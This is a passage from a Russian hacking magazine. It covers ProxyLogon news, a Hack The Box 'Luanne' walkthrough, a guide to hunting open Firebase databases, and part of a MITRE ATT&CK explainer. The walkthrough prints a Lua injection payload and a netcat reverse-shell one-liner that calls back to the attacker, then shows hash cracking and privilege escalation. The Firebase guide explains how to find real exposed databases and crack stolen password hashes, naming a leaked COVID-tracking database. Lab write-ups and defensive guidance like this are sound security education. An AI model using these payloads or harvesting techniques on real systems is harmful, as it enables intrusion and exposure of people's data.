на GitHub рабочий proof‐of‐concept эксплоита для этого набора уязвимостей.
Буквально на сле дующий день этот экс плоит был уда лен с сай та, но осадочек
остался интернет, как извес тно, помнит все, что однажды оказалось в пуб‐
личном доступе.
   Вскоре к майнерам добавился тро ян‐шифровальщик DearCry, который
хакеры начали запускать на взло манных серверах. В начале марта пострадав‐
ших компаний насчитывалось шсть (в Авс тралии, Австрии, Дании, Канаде
и США), но затем их число начало рас ти. К первому вымогателю добавил ся
энкодер Black Kingdom, шифровавший фай лы на сервере и требовавший
за дешифровку выкуп в раз мере 10 тысяч долларов.
  Поскольку положение с уяз вимостями ProxyLogon выглядит серьезно
и  устрашающе, кор порация  Microsoft выпустила не  только об новления
безопасности для Exchange Server, но и ис правления для старых версий Ex‐
change. Кроме того, инженеры Microsoft подготови ли специальный скрипт
PowerShell, предназначенный для проверки серверов Exchange на наличие
веб‐шеллов и известных индикаторов компро метации.
  Тем не менее картина по‐прежнему оста ется без радостной. Согласно об‐
щедоступным  данным,  в  нас тоящий  момент  в  интернете  работает
более 282 тысяч серверов Microsoft Exchange, и мно гие из них по‐прежнему
остаются уязвимыми. До тех пор пока системные администраторы не уста‐
новят на все уязвимые серверы необходимый набор обновлений, взломы,
скорее всего, будут продолжаться, а журнал «Хакер» будет радовать своих
читателей новостями об очередных инци дентах, свя занных с использованием
злоумышленниками ProxyLogon.
ВЗЛОМ


         HTB
 LUANNE





        ЭКСПЛУАТИРУЕМ LUA,
  ЧТОБЫ ЗАХВАТИТЬ МАШИНУ С NETBSD





Сегодня мы разберем тачку под названием
Luanne с площадки Hack The Box, а на ее
примере  я  покажу,  как  эксплуатировать
инъекции в код на Lua, обходить дирек‐
тории на веб‐сер вере, а также как выпол‐             RalfHacker                                                                                             hackerralf8@gmail.com
нять привилегированные команды в Net‐
BSD  без  использования  sudo. Уро вень
сложности — Easy, так что полезно будет
в первую очередь новичкам.


           WARNING

                     Подключаться к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                    жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
IP‐адрес машины —  10.10.10.218, сра зу добавляем его в /etc/hosts
для удобства.


10.10.10.218    luanne .htb

Начинаем со сканирования портов. Я, как всегда, использую небольшой
скрипт, который запускает Nmap в два этапа: быс трое общее сканирование
и затем на обнаруженных портах — сканирование со скриптами.


#!/bin/bash
ports=$(nmap ‐p‐ ‐‐min‐rate= 500 $1 | grep ^[0‐9] | cut ‐d '/' ‐f 1 |
tr '\n' ',' | sed s/,$//)
nmap ‐p$ports ‐A $1





                    Результат работы скрипта

В результате сканирования мы узнаем о трех служ бах:
 • порт 22 — SSH;
 • порт 80 — веб‐сервер nginx 1.19.0;
 • порт 9001 — асинхронный сокет‐сервер Medusa 1.12.

На SSH нам ловить нечего, так как единственное, что там можно сделать, —
это брутфорсить учетные данные. Вмес то этого попробуем поискать точку
входа на сайте. Однако и на 80‐м, и на 9001‐м портах нас ожидает HTTP‐
авторизация, в данном случае — Basic. Пос коль ку никаких учетных данных
у нас вначале нет, это серьезная проб лема.
  Еще Nmap показал нам наличие файла robots.txt на сервере nginx. Этот
файл нужен, чтобы огра ничить обход сай та поис ковыми роботами (Google,
Яндекс и прочими). Иногда в нем можно почерпнуть идеи для развития атаки.


Перебор каталогов
Файл robots.txt состоит из набора инструкций, при помощи которых можно
задать файлы, страницы или каталоги сайта, которые не будут индекси‐
роваться поисковыми движками. К примеру, сделать так, чтобы в результатах
поисковых систем не появлялись страницы авторизации адми нистраторов
сайта, файлы или персональная информа ция со страниц пользователей. Но у
любой медали две стороны: злоумыш ленники и пентестеры, конечно же, сра‐
зу заглядывают в этот файл, чтобы узнать, что пря чут админы.
  Наш случай не исключение. В robots.txt есть директория weather. Нап‐
рямую ее прочесть нельзя, но если сделать перебор по словарю, то мы
можем наткнуться на что‐то интерес ное. Для ска нирования я использовал
утилиту ﬀuf. В качестве параметров ей нуж но передать список для перебора
(опция ‐w) и URL (опция ‐u). Место в URL, куда будут подставляться слова
из списка, отме чается сло вом FUZZ.



  ffuf ‐w /usr/share/wordlists/dirbuster/directory‐list‐lowercase‐2.3‐
  medium.txt ‐u http://luanne.htb/weather/FUZZ/




         Результат ска нирования содержимого каталога weather

Мы быстро находим еще один каталог, который вернул код 200, а это значит,
что он нам доступен.


ТОЧКА ВХОДА
Находим каталог forecast и про буем зайти туда через браузер. Страница
пуста, но если посмотреть исходник ответа, то уви дим подсказ ку.




          Сообщение о требова нии передачи параметра city

Требуется указать параметр city, одно из значений которого может быть
list. Делаем соответствующий запрос и получа ем список городов в фор‐
мате JSON.





Обычно при тестировании веб‐приложений стоит определить три реакции
приложения на пользовательский запрос: успешно обработанный запрос,
неудачно обработанный запрос и ошиб ка при обработке запроса. Давай
выпол ним три запроса:
 • запрос валидного города (город из списка);
 • запрос невалидного города (город, которого нет в списке);
 • запрос, который вызывает ошибку (использует разные служебные сим‐
   волы, в данном случае — кавычку).





                     Зап рос города из списка





                Запрос города, которого нет в списке


            Вызов ошибки отправкой символа кавычки

В последнем случае видим ошибку от интерпретатора язы ка Lua: attempt
to call a nil value. Это значит, что наш ввод был подставлен в скрипт без пред‐
варительной чистки, а это открывает возможность для инъекции кода.


ЗАКРЕПЛЕНИЕ
Lua — скриптовый язык, а значит, нефиль тро ванные вставки в код очень
опасны. Можно вместо значения передать закрывающую кавычку и любой код
на Lua — он будет выполнен интерпретато ром как родной.
  Давай попробуем подобным обра зом закрыть строку и добавить функцию
execute из модуля os — она выполняет любую команду операционной сис‐
темы. Дальше добавим объявление переменной и откры вающую кавычку,
чтобы закрывающая кавычка, иду щая в коде даль ше, не осталась без пары
и не привела к ошибке исполнения. Вот так, к примеру, можно прочитать
файл /etc/passwd:


') os.execute("cat /etc/passwd") x=('

Полный запрос, сделанный командой сurl, будет выглядеть следующим обра‐
зом:



  curl "http://luanne.htb/weather/forecast/?
  city=London')%20os.execute("cat%20/etc/passwd")%20x%3D('"





                     Результат вставки кода

Так как команды успешно выполняются, мы можем просто выпол нить готовый
бэкшелл и получить возможность управлять машиной.


os.execute("rm /tmp/r;mkfifo /tmp/r;cat /tmp/r|/bin/sh ‐i 2>&1|nc [
ip] [port] >/tmp/r")

Этот код должен вызвать коннект на указанный адрес, нужно лишь вписать IP
и порт. Но прежде чем запускать эту команду, создадим лис тенер, который
будет принимать это соединение. Я советую исполь зовать rlwrap, это удобная
оболочка, которая в чис ле прочего ведет историю команд. В качестве лис‐
тенера используем извес тный netcat.



  apt install rlwrap
  rlwrap nc ‐lvp [port]


Закодируем нашу нагрузку в URL Encode и выпол ним запрос. Почти момен‐
тально в консоли netcat получаем сообщение об обратном подключении.



  curl "http://luanne.htb/weather/forecast/?
  city=London')%20os%2Eexecute%28%22rm%20%2Ftmp%2Fr%3Bmkfifo%20%2Ftmp%2Fr%
  3Bcat%20%2Ftmp%2Fr%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2
  E108%204321%20%3E%2Ftmp%2Fr%22%29%20x%3D('"





                     Получение бэкшелла

Команда id помогает нам узнать, что мы работа ем в контексте учетной
записи службы _httpd.


ПРОДВИЖЕНИЕ
Сначала немного проапгрейдим свой шелл, так как нам может пригодиться
оболочка TTY. Ее можно получить с помощью имеющегося в целевой системе
интерпретатора Python 3.



  python3 ‐c 'import pty; pty.spawn("/bin/sh")'
  /bin/bash


Доступ к хосту есть, но для дальнейшего продвижения нам нужны учетные
данные пользователей. Не беда — нужно лишь знать места, где их искать.
Одно из таких мест — серверная часть сайта. Почти у всех сайтов есть
источник учетных данных, в большинс тве случаев это БД. То есть атакующий
получает доступ к базе данных и извлекает из нее имена пользователей
и хеши их паролей.
  В нашем случае используется аутентификация HTTP Basic, а это значит,
что какие‐то учетные данные получить все же мож но. Сначала проверим
наличие файла .htpasswd в рабочей директории веб‐сервера, этот файл
содержит имя и хеш пароля пользователя.





                       Файл .htpasswd

Сохраним хеш в файл и переберем его, к примеру, с помощью John The Rip‐
per. В параметрах я указываю словарь с паролями и файл с хешем. «Джон»
сам определит алго ритм, выполнит перебор и в слу чае успеха вернет нам
пароль.



  john ‐‐wordlist=./tools/rockyou.txt web.hash




                    Результат перебора пароля

С этим паролем не получается авторизовать ся как пользователь системы,
поэтому продолжаем искать. Я подметил, что домашняя пользовательская
директория /home/r.michaels доступна для чтения группе users, а для
локального хоста прослушиваются TCP‐порты 3000 и 3001 (это можно узнать
командой netstat ‐ant).




                 Содержимое каталога /home/




                   Прослушиваемые TCP‐порты

Чтобы определить, за что отвечают эти порты, подключимся к каждому
с помощью netcat и посмотрим, что нам вернут.



  nc 127.0.0.1 3000
  nc 127.0.0.1 3001





                Подключение к портам 3000 и 3001

Как видишь, эти пор ты отно сят ся к веб‐серверу bozotic. Проверим, что он нам
даст посмотреть в корневом катало ге. Ответ на обоих портах одинаковый —
требуется HTTP‐авторизация (код 401).



  curl 127.0.0.1:3000
  curl 127.0.0.1:3001





          Ответ сервера при обращении к корневому каталогу

Но у нас уже есть некоторые учетные данные, и они тоже предназначены
для HTTP‐авторизации. Давай попробуем обратиться, указав их. Для этого
просто добавим к вызову curl параметр ‐‐user.



  curl ‐‐user webapi_user:iamthebest 127.0.0.1:3001





                    Авториза ция на веб‐сервере

Довольно интересно, ведь такой ответ отличает ся от того, что нам доступно
извне. Я попробовал получить доступ к домашней директории пользователя,
и тут меня ждал успех.





       Получение списка файлов в пользовательской директории

Из всех его файлов самый важ ный — приватный ключ SSH, который позволит
нам авторизоваться и получить управление через SSH.





                    Получение ключа SSH

Осталось сохранить ключ в файл, наз начить ему необходимые права и под‐
клю читься от имени скомпрометированного пользователя.



  chmod 0600 id_rsa
  ssh ‐i id_rsa r.michaels@luanne.htb





                       Флаг пользователя

После приветствия NetBSD мы забираем первый флаг.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Дальше никуда ходить не нужно — сра зу в домашней директории пользовате‐
ля находим бэкап с расширением .tar.gz.enc. Прочитав об этой цепочке
расширений, я пришел к выводу, что файл, скорее всего, зашиф рован
при помощи OpenSSL или netpgp. В первом случае требуется пароль,
а netpgp использует приватный ключ пользователя, который у нас уже есть.
Пробуем расшифровать с помощью его:



  netpgp ‐‐decrypt devel_backup‐2020‐09‐16.tar.gz.enc ‐‐
  output=/tmp/out.tar.gz


Удача! Видим пользовательские файлы.



            Список поль зовательских файлов и каталогов





                Расшифровка файла с помощью netpgp

Перед нами копия содержимого каталога веб‐сервера, где мы находим
еще один файл .htpasswd. Бру тим его точно так же, как это делали немного
ранее.



  john ‐‐wordlist=./tools/rockyou.txt web2.hash




                    Результат перебора пароля

Мы получаем еще один пароль, с которым по логике таких заданий мы можем
идти за рутом. Увы, авто риза ция через SSH оборачивается неудачей. При‐
вычный метод смены пользователя командой su также не приносит никаких
плодов.



          Попытка смены поль зователя с использованием su

Однако секрет прост: в NetBSD нет привычного нам sudo, а для выполнения
административных задач используется ана лог — does. В качестве параметра
передадим ему файл оболочки bash.





           Использование does для повышения привилегий

Пишем id и узнаем, что мы работа ем в контексте учетной записи root. А это
значит, что машина захвачена и у нас есть полный контроль над ней.
ВЗЛОМ

     ПЕШКОМ ПО
 FIREBASE

                НАХОДИМ ОТКРЫТЫЕ
                     БАЗЫ ДАННЫХ,
             КОТОРЫЕ ПРЯЧЕТ GOOGLE





                                                                                                     8bit
                                                                                                 vegelin47@mail.ru





Облачная база данных — штука удобная: считай, вся работа
по деплою и нас тройке сервера за тебя уже сде лана, оста‐
лось только пользоваться! Админов это расслабляет нас‐
только, что такие базы часто оста ются незащищенными
и ищутся с помощью поисковиков. Один нюанс — этим поис‐
ковиком не может быть Google!


           WARNING

                      Вся информация предоставлена исключительно
                        в  ознакомительных  целях.  Автор и  редакция
                      не несут ответственности за любой возможный
                        вред, причинен ный с использованием сведений
                       из этой статьи.


Firebase — это облачная плат форма, которую раз работала компания Envolve
в 2011 году. Изначально это была база данных для приложений‐чатов, но поз‐
же ее полюбили разработчики многопользовательских онлайновых  игр.
Это подвигло основателей раз делить Firebase на две части: модуль чата
и модуль игрового фреймворка.
  Два года спустя, в 2014 году, Google приобрела Firebase и продол жила
развивать. Программные интерфейсы для этой базы данных есть для мно‐
жества платформ и языков прог раммирования.


             INFO

                     Подробнее про  Firebase — в  статье  «Строим
                      мобильное приложение на Firebase — бесплатном
                      и мощном бэкенде Google».


С технической точки зрения Firebase — крутая и удоб ная штука. Кажется, что
ничего докручивать и допиливать здесь не нуж но. Но безопас ная настройка
облачной базе таки нужна, и многие вла дельцы об этом забывают, чересчур
расслабившись. Настолько, что забыва ют о прос тейшей вещи — аутен‐
тификации.


ИЩЕМ ОТКРЫТЫЕ БАЗЫ ДАННЫХ
Получается, что в интернете масса не закрытых паролем баз данных, а это
легкая добыча для злоумышленников. Только вот взять и нагуглить их
не получится, потому что в Google решили, что эту проблему можно решить,
просто исключив эти базы из поисковой выдачи. Ловко! Но крайне ненадеж‐
но.





                Поиск Google по запросу Firebase

Ничто не мешает нам воспользовать ся другим поисковиком — например,
Bing или DuckDuckGo. Они выда ют уже намного больше полезной информа‐
ции.





              Поисковый запрос в Bing и DuckDuckGo

Что можно сде лать дальше, после того как найдены домены с уяз вимыми
базами? Открываем любую ссылку — например, https://hacker‐news.
firebaseio.com/v0/topstories.json. Информа ция о  ней  бес полезна,
но если убрать из ссылки название таб лицы topstories и оставить только
.json, то можно проверить, защищена база или нет. В этом случае результат
выглядит вот так:


{
  "error" : "Permission denied"
}

Все верно, лич но я бы знат но удивил ся, если бы владельцы этого сайта
допустили настолько вопиющую оплошность. Но некоторые ее таки допус‐
кают. Минут десять перебо ра ссылок, и поиск увенчается успехом.





                 Найденная откры тая база данных

Я нашел что‐то более интерес ное — учет ки с хешами паролей. Выбрать их
из файла несложно простым скриптом на Python или утилитой jq.
  При помощи HashID определяем тип хешей (это был MD5) и загоняем
в hashcat. Если нет дос таточно мощ ного железа, можно воспользоваться
онлайновым сервисом — тулза FindMyHash автоматически их подбирает. Все
эти утилиты предустановлены в Kali Linux.





                  Взлом пароля через FindMyHash

Ждем десять минут, и перед нами логины и пароли в открытом виде.





        Найденная база с открытыми паролями в откры том виде


АВТОМАТИЗАЦИЯ
Сидеть, менять поисковики и переби рать все URL вручную очень нудно.
Слишком часто видишь «error  : Permission denied». Значит, пора автомати‐
зировать! Программировать, правда, не пот ребуется, потому что это уже сде‐
лали до нас. Возьмем, к примеру, скрипт за авторством Францеска Эрреры.
   Скрипт сам подбира ет URL и ищет уязвимые базы данных.
   Качаем его и устанавливаем зависимости:


git clone https://github.com/Turr0n/firebase.git
cd firebase
pip install ‐r requirements.txt

И запускаем:


python3 firebase.py ‐p 4  ‐c 150 –dnsdumpster

Ключи:
 • p — указывает количество потоков (по умолчанию 1, максимум 4);
 • dnsdumpster — генерирует URL самос тоятельно;
 • с — какое количество доменов генерировать.

Да, скрипт умеет генерировать ссылки самостоятельно. Точнее, делает
это не сам, а обращается за помощью к утилите DNSdumpster.





                    Результат работы скрипта

По результату видно, что из найденных баз:
 • 37 урлов «битые» или больше не сущес твуют;
 • 171 база имеет аутентифика цию при обра щении к данным и защищена;
 • одна база с подозрением на уязвимость;
 • 25 баз не защищены или уяз вимы.

Можно скормить скрипту и свой список. В нем должны быть только под‐
домены третьего уровня. Например, ты делаешь вот такой входной список:


xxx
yyy
zzz

Тогда скрипт проверит вот эти URL:


https://xxx.firebaseio.com
https://yyy.firebaseio.com
https://zzz.firebaseio.com


В поисках поддоменов
Чтобы получить наиболее эффективный список, можно воспользоваться
скриптом sublist3r, который исполь зует раз ные техники поиска и OSINT, чтобы
подобрать наиболее правдоподоб ные варианты.
  Запускаем:


python3 sublist3r.py ‐d firebaseio.com

И на выходе получаем око ло 650 доменов. Работа ет очень быстро.





               Поиск доменов программой sublist3r

Еще одна утилита для генерации доменов — subbrute. Она выдала мне в рай‐
оне 100 поддоменов, но работала 30–40 минут.





              Поиск поддоменов программой subbrute

Censys‐subdomain‐ﬁnder, на который я воз лагал большие надежды, выдал
всего семь доменов. К сло ву, и сам сервис выдал немного — 25 урлов.
  Все перечисленные утилиты не входят в состав дистрибутива Kali Linux, их
пришлось качать отдельно.
  Из онлайновых сервисов мож но воспользоваться nmmapper, DNSdump‐
ster, Pentest‐Tools.
   Если все еще мало, можно задейство вать знания о том, что настройки
интеграции происходят в файле google‐services.json, и поискать в гите
запросом site:github.com  google‐services.json. Этот вариант идет
вразрез со словом «авто матизация», зато можно докопаться до уникальных
баз.


Ковыряем и дописываем скрипт
Теперь мы вооружены добротным набором урлов и знаем, что какие‐то из них
могут быть уязвимы. Даже можем запус тить скрипт и проверить количество
неверно настроенных баз из нашего списка. Но цель в таких случаях —
не собрать статистику, а получить уязвимые цели. Поэтому откроем код
скрипта и слегка поправим.
  Посмотри вот на этот кусок кода:


urls = set()
with open(args_.list, 'r') as f:
  [urls.add('https://{}.firebaseio.com/.json'.format(line.rstrip()))
for line in f]

Из него понятно, как формиру ется полный адрес. А в конце формируется
отчет:


print('404 DBs:                 {}'.format(l['‐2']))
print('Secure DBs:              {}'.format(l['‐1']))
print('Possible vulnerable DBs: {}'.format(l['0']))
print('Vulnerable DBs:          {}'.format(l['1']))

Кусок кода с про веркой я приводить не буду. Там нет ничего любопытного,
мне нужно было найти само присвоение. И вот оно:


with open(args_.fn, 'w') as f:
  json.dump(loot, f)
l = {'1':0, '0':0, '‐1':0, '‐2':0}
for result in loot:
  l[str(result['status'])] += 1

Вот в этом месте я соз даю свой мас сив по ста тусу 1. Так как я еще не
понимаю, чем его заполнять, записываю все подряд. Получилось примерно
следующее:


l = {'1':0, '0':0, '‐1':0, '‐2':0}
Vulnerable = []
for result in loot:
  l[str(result['status'])] += 1
  if str(result['status']) == '1':
    Vulnerable.append(result)

И в конце добав ляю вывод результата в консоль:


print('404 DBs:                 {}'.format(l['‐2']))
print('Secure DBs:              {}'.format(l['‐1']))
print('Possible vulnerable DBs: {}'.format(l['0']))
print('Vulnerable DBs:          {}'.format(l['1']))
print(Vulnerable)

После запуска вижу такую картину.





               Работа программы пос ле вмешательства

Мне высыпалось все, что хранилось в базах. Зато теперь я знаю, что записы‐
вать в Vulnerable. Правим код, как надо:


l = {'1':0, '0':0, '‐1':0, '‐2':0}
Vulnerable = []
for result in loot:
  l[str(result['status'])] += 1
  if str(result['status']) == '1':
    Vulnerable.append(result['url'])
...
print('404 DBs:                 {}'.format(l['‐2']))
print('Secure DBs:              {}'.format(l['‐1']))
print('Possible vulnerable DBs: {}'.format(l['0']))
print('Vulnerable DBs:          {}'.format(l['1']))
print(Vulnerable)

На этот раз при запуске видим то, что было нуж но, — спи сок уязвимых баз.




          Работа скрипта пос ле хирургического вмешательства

Особенно меня заинтересовала вот эта ссылка: https://covid‐19‐track‐
er‐e76ca.firebaseio.com/.json. В Малайзии так спе шили отсле живать
перемещения боль ных ковидом, что не пос тавили пароль на базу данных с их
координатами...


КАК НЕ ДОПУСТИТЬ УТЕЧКУ
Назвать эту проблему уяз вимостью — некоторое преувеличение. Все сводит‐
ся к тому, что Google позволяет открыть доступ к содержимому базы всем
неавторизованным поль зователям, и некото рые раз работчики так и пос тупа‐
ют.
  Поэтому, чтобы защититься, достаточно про писать политики безопас‐
ности Firebase. Google предлагает придерживать ся следующих правил.
  Даже во время разработки (на тесте и на stage) не стоит откры вать дос туп
ко всем данным в Firebase неавторизованным поль зователям, но есть воз‐
можность открыть их при авториза ции:


service cloud .firestore {
  match /databases/{database }/documents {
    match /{document =**} {
      allow read , write : if request.auth != null ;
    }
  }
}

Это правило необ ходимо, когда нес кольким пользовате лям нужно работать
с одним контентом.
  Следующее правило дает доступ к данным толь ко владельцам этих дан‐
ных. Остальные поль зователи не смогут их видеть или обрабаты вать:


service cloud .firestore {
  match /databases/{database }/documents {
    // Allow only authenticated content owners access
    match /some_collection /{userId }/{documents=**} {
      allow read , write : if request.auth != null && request.auth .uid
== userId
    }
  }
}

И третье правило устанавливает дос туп на чтение некоторых данных некото‐
рым пользователям, но редактирование — только его владельцу:


service cloud .firestore {
  match /databases/{database }/documents {
    // For attribute‐based access control, Check a boolean `admin `
attribute
    allow write : if get (/databases/$(database )/documents/users /$(
request.auth .uid )).data .admin == true ;
    allow read : true ;


    // Alterntatively, for role ‐based access , assign specific roles
to users
    match /some_collection /{document } {
      allow read : if get (/databases/$(database )/documents/users /$(
request.auth .uid )).data .role == "Reader"
      allow write : if get (/databases/$(database )/documents/users /$(
request.auth .uid )).data .role == "Writer"
    }
  }
}

Более подробные сведения о безопас ности аутентификации и кон троле дос‐
тупа можно найти в документации Firebase.


ЗАКЛЮЧЕНИЕ
Итак, мы рассмотрели, как происходит утечка данных, разобрались с поиском
уязвимых URL, научились авто матизировать про цесс и узнали, как избежать
этой проблемы.
  В документации по безопас ности Firebase приведены и сами правила,
и разные способы защитить данные. Не стоит ими пренебрегать, перек‐
ладывая ответственность на какие‐нибудь гей ты или прокси‐серверы. Адрес
базы может быть обнаружен.
ВЗЛОМ

     МАТРИЦА
 ATT & CK
   КАК УСТРОЕН ЯЗЫК ОПИСАНИЯ УГРОЗ
       И КАК ЕГО ИСПОЛЬЗУЮТ





         Борис Осепов                                              Александр Мессерле
        Специалист Group‐IB.                                                 ИБтивист. Исследую в ИБ то,
        Увлекаюсь средствами                                                      что движется. То, что не
      анализа вредоносного ПО.                                               движется, кладу в песочницу.
        Люблю проверять                                                           nayca@mail.ru
       маркетинговые заявления
            на практике :)
       mainboros777@gmail.com





MITRE ATT&CK — одна из популярнейших методологий сре‐
ди специалис тов по информа ционной безопасности. В этой
статье мы рас скажем, как создавалась и как устроена база
знаний, при помощи которой описыва ют возможности мал‐
вари, составляют профили APT‐груп пировок и пишут пра‐
вила для автоматизации расследова ний.


Итак, что такое MITRE и что за ата ки? MITRE — это некоммерческая организа‐
ция, которая работает в США и управляет центра ми иссле дований и раз‐
работок на уровне федерального пра вительства и местного самоуправления.
В  зону  интересов MITRE  входят:  искусственный  интеллект,  квантовая
информатика,  информа тика  в  области  здра воохранения,  космическая
безопасность, обмен данными о киберугрозах и средствах защиты и так
далее.
  В сфере информационной безопас ности корпорация MITRE известна бла‐
годаря списку CVE (Common  Vulnerabilities and Exposures)  cve.mitre.org.
Это база общеизвестных уяз вимостей, которая появилась в 1999 году и с тех
пор стала одним из основных ресурсов, где структурируют и хранят данные
по багам в ПО. Именно эти базы используют злоумышленни ки при первой
попытке проникнуть в инфраструктуру жертвы пос ле сканирования сети.
  CVE — не единственный про ект MITRE, связанный с защитой информации.
Существуют и активно раз виваются также такие направления:
 • ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge), attack‐
   .mitre.org — это структурированный список известных техник, приемов
   и тактик злоумышленников, представленный в виде таб лиц;
 • Structured Threat Information Expression (STIX) — это язык и формат сери‐
   ализации, используемый для обмена информацией о киберугрозах (CTI —
   Cyber Threat Intelligence) между системами информационной безопас‐
   ности;
 • CAR (Cyber Analytics Repository) — база зна ний, разработанная на основе
  модели ATT&CK. Она может быть представлена в виде псевдокода,
   и команды защитников могут использовать ее при создании логики детек‐
   тирования в системах защиты;
 • SHIELD Active Defense — база зна ний по активной защите, которая сис‐
   тематизирует методы безопасности и дополняет меры снижения рисков,
   представ ленные в ATT&CK;
 • AEP (ATT&CK Emulation Plans) — это способы моделирования поведения
   злоумышленника на основе определен ного набора TTP (Tactics, Tech‐
   niques, and Procedures) по ATT&CK.

Отечественные регуляторы, кста ти, тоже занима ются подобными исследова‐
ниями — 5 февраля 2021 года ФСТЭК Рос сии выпустил методичес кое
пособие по оценке угроз безопасности информации. На тридцатой странице
показан пример сценария атаки.





                 Фрагмент методического пособия

В народе эту таблицу уже проз вали FST&CK, но это уже совсем дру гая исто‐
рия...


ЗАЧЕМ НАМ ATT&CK
MITRE представил матрицу ATT&CK в 2013 году как способ описания
и  категоризации  поведения  зло умышленников  (составления  паттернов
поведения) на основе реальных наблюдений. Прежде чем начать разбирать,
как пользоваться матрицей, давай пройдемся по основным понятиям (не
переживай, их всего три).
  APT (Advanced Persistent Threat) — это группа зло умышленников или даже
страна, которые участвуют в про должительных кибератаках на организации
или страны. Дословный перевод термина — продвинутая постоянная угроза.
Прочитав всю статью, ты поймешь, что особо продвинутого ничего нет.


        WWW

                      Большой список известных APT‐групп, который
                        ведут фанаты информационной безопасности.


Наборы TTP (техники, тактики и процеду ры), рас шифровываются следующим
образом:
 • так тика — как зло умышленник действует на разных этапах своей опе‐
   рации, какая цель или задача зло умышленника на определенным шаге,
   например: TA0002 Execution — это когда злоумышленник пытается запус‐
   тить свой вредоносный код. Да, зву чит банально, но ты пос мотри, что
   будет дальше;
 • техника — как злоумышленник дос тигает цели или поставленной задачи,
   какие использует инс трументы, технологии, код, эксплоиты, ути литы и так
   далее. Пример:  T1059.001  PowerShell —  использование  PowerShell
   при атаке;
 • про цеду ра — как эта техника выполняется и для чего. Например: вре‐
   доносная программа, используя PowerShell, скачивает пейлоад, который,
   в свою очередь, загружа ет Cobalt Strike для попытки запуска на удаленных
   хостах (чуешь, что тут произошло объединение техники и тактики?).

Как вообще действует атакующий? Он открывает свой учеб ник для мамкиных
хакеров, где на второй стра нице зна комится с понятием Kill Chain. Kill Chain,
то есть «цепочка убийства», — модель, определяющая последовательность
действий, ведущих нарушителя к цели. Она состоит из ряда обычно пос‐
ледовательных этапов:
 • reconnaissance — раз ведка;
 • weaponization — подготовка к ата ке, определение инстру ментария и deliv‐
   ery — доставка;
 • exploitation — эксплуата ция арсенала;
 • installation — установка;
 • command & control (С2) — управление через командные серверы;
 • lateral movement — горизонтальное перемещение, распространение внут‐
   ри сети;
 • objectives — целевое воз действие.

Матрица MITRE ATT&CK началась с внутреннего про екта, извес тного как FMX
(Fort Meade Experiment). В рамках его специалис там по безопас ности пос‐
тавили задачу имитировать враждебные TTP против сети, а данные об атаках
на эту сеть затем собирали и ана лизирова ли. Именно эти данные потом легли
в основу ATT&CK. Поскольку матрица ATT&CK представляет собой довольно
полное описание поведения, которое злоумышленни ки используют при взло‐
ме сетей, матрица полезна для различных нас тупательных и защитных изме‐
рений, представлений и дру гих механизмов (например, моделирования угроз
по ФСТЭК).
  MITRE разбил ATT&CK на нес колько сводных мат риц:
 • Enterprise — TTP, используемые при атаках на орга низации;
 • Mobile — TTP, связанные с переносными устройствами;
 • ICS — Industrial Control Systems, TTP для индус триальных систем.

В каждой из них — тактики и техники, свя занные с предметом этой матрицы.
Самая популярная матрица — Enterprise. Она, в свою очередь, сос тоит
из ответвлений, ответственных каждое за свое:
 • PRE Matrix — предварительные лас ки;
 • Windows — атаки на инфраструктуры на основе Windows;
 • macOS — то же для яблокомпьютеров;
 • Linux — догадайся;
 • Cloud — атаки на облака;
 • Network — атаки на сеть.

Дальше мы рассмотрим именно эту матрицу. Разбивка на подматрицы сде‐
лана не просто так. Например, PRE Matrix и осталь ные части можно наложить
на этапы киллчейн сле дующим обра зом.





           Матрица ATT&CK Enterprise для модели Kill Chain

Как видишь, в PRE Matrix содержатся данные, которые касаются под готови‐
тельных этапов атаки, например ска нирование и инвентаризация  сети,
фишинг или социальная инженерия. А остальные подтаблицы матрицы Enter‐
prise содержат самое интерес ное. В верхней час ти матрицы расположе‐
но 14 категорий. Каждая катего рия содержит тактики, которые может исполь‐
зовать злоумышленник.



  Категории матрицы ATT&CK Enterprise и количес тво вложенных техник
  в каждой категории

Разберем, например, тактику Execution (исполнение). Сколькими способами
можно что‐либо запустить на конечной системе? Выдумы вать велосипед
и собирать консорциум уже не нужно, все давно продумали умные дяди. Рас‐
кроем выбранную тактику TA0002 Execution и увидим, сколько техник исполне‐
ния бывает. Их всего десяток, не считая подтехник:
 • T1059 — Command and Scripting  Interpreter, командные и скриптовые
   интерпретаторы;
 • T1203 — Exploitation for Client Execution, использование уязвимос тей в кли‐
   ентском ПО;
 • T1559 — Inter‐Process Communication, исполь зование межпроцессного
   взаимодействия;
 • T1106 — Native API, взаимодействие с API операци онной системы;
 • T1053 — Scheduled Task/Job, жизнь в планировщиках;
 • T1129 — Shared Modules, загрузка DLL;
 • T1072 — Software Deployment Tools, использование сис тем разверты вания
  ПО;
 • T1569 — System Services, применение служб;
 • T1204 — User Execution, действия пользователя, направленные на удобс‐
   тво злоумышленника;
 • T1047 — Windows Management Instrumentation, использование WMI.

У техники могут быть свои подтехники. Если ты кликнешь на правую часть
(невразумительную серую трапецию), они раскрываются.





          Подтехники T1059 Command and Scripting Interpreter

Скрипты и команды указаны для разных популярных ОС, которые могут
использоваться при проведении вредоносной кампании. Если  кликнуть
по надписи, открывается страница, посвященная описанию опре деленной
техники, как пример — по клику на Command and Scripting Interpreter откры‐
вается доступ ко всей связанной информа ции, касающейся этого метода,
а именно: краткое описание техники, примеры процедур по различным груп‐
пировкам и меры для снижения рисков.
  При моделировании угроз по новой методи ке ФСТЭК ты должен исполь‐
зовать набор TTP, как конструктор Lego. Видишь ата ку — формируй все пути
ее реализации (сценарии) из кубиков TTP, причем MITRE ATT&CK указывается
как один из возможных источников для формирования исходных данных.
   Чтобы выделить используемые техники, тактики и процедуры, после ана‐
лиза вредоносной программы можно воспользоваться MITRE ATT&CK Naviga‐
tor вместо Excel. Для примера можешь посмотреть разложения целевой атаки
Carbanak на TTP.
  Короче, мат рицу MITRE ATT&CK использовать можно и нужно — и в рамках
анализа вредоносного ПО, и для сопос тавления тактик и методов разных
группировок. В качестве примера можешь пос мотреть ис следование Group‐
IB, в котором разбирается шифровальщик ProLock. Там есть раз дел MITRE
ATT&CK Mapping, где расписаны исполь зуемые тактики и техники.
  Для автоматизации маппинга мож но использовать официальный инс тру‐
мент (пока он beta) Threat Report ATT&CK Mapper (TRAM), который с помощью
